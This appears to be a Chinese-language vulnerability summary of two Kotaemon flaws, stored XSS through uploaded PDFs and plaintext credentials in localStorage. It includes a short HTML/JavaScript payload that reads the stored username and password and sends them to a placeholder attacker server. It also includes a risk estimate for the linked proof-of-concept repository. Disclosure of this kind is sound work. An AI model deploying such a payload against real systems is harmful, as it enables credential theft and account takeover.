## CVE-2025-56526 & CVE-2025-56527 - Kotaemon Stored XSS & 明文凭据存储

**漏洞编号:** CVE-2025-56526

**漏洞类型:** 存储型XSS, 明文凭据存储

**影响应用:** Kotaemon

**危害等级:** 高危，可能导致凭据泄露、会话劫持、UI篡改和进一步的社会工程攻击

**影响版本:** <= 0.11.0

**利用条件:** 需要认证用户具有文档上传权限

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞由两部分组成：

1.  **CVE-2025-56526: 存储型XSS：** Kotaemon对PDF提取的内容（文本、表格标记、图片元数据）未进行充分的转义，直接注入到DOM中。因此，攻击者可以构造包含恶意HTML/JS代码的PDF文件，当信息面板或推理视图渲染`retrieved_content`时，这些代码就会被执行。

2.  **CVE-2025-56527: 明文凭据存储：** Kotaemon将用户名和密码以明文形式存储在`localStorage`中，攻击者可以通过XSS漏洞直接读取这些值，从而实现凭据窃取和长期账户接管。

**利用方式：**

1.  攻击者构造一个恶意的PDF文件，其中包含XSS payload，例如：
    ```html
    <img src=x onerror="
    (() => {
      const u = localStorage.getItem('username');
      const p = localStorage.getItem('password');
      if (u && p) {
        new Image().src='https://[ATTACKER-SERVER]?d=' + btoa(`id=${u}&pw=${p}`);
      }
    })();
    ">
    ```

2.  攻击者将该PDF文件上传到Kotaemon。

3.  当受害者查看该PDF文件时，嵌入的JavaScript代码会在应用程序的origin下执行，从`localStorage`中读取用户名和密码，并将其发送到攻击者的服务器。

**有效性评估：**

提供的PoC代码有效，因为它利用了存储型XSS漏洞来窃取存储在`localStorage`中的明文凭据。这种组合使得攻击非常有效，因为XSS payload一旦注入，就会持续威胁其他用户。

**投毒风险评估：**

该仓库中存在投毒代码的风险较低，约为10%。PoC 代码本身专注于展示漏洞利用，没有发现明显的后门或恶意行为。然而，由于代码发布在公共存储库中，存在被恶意修改的可能。例如，攻击者可能会添加收集系统信息或部署后门的额外代码。因此，用户在使用这些代码时应谨慎，仔细审查代码，并在隔离环境中进行测试。

总结：PoC的重点在于论证漏洞，但也不能完全排除投毒的可能性。务必在生产环境中使用前进行仔细的安全审计。

**项目地址:** [HanTul/Kotaemon-CVE-2025-56526-56527-disclosure](https://github.com/HanTul/Kotaemon-CVE-2025-56526-56527-disclosure)

**漏洞详情:** [CVE-2025-56526](https://nvd.nist.gov/vuln/detail/CVE-2025-56526)